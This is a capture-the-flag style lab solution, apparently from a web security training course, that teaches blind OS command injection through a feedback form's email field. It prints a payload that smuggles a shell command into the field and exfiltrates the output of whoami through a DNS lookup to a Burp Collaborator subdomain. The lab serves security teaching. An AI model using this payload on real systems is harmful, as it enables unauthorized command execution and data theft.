# Lab 5: Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

## Solution
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Collaborator tab.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
5. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.

# Video Solution
[Sommer's YT Video](https://youtu.be/SliqOK3RgEA)
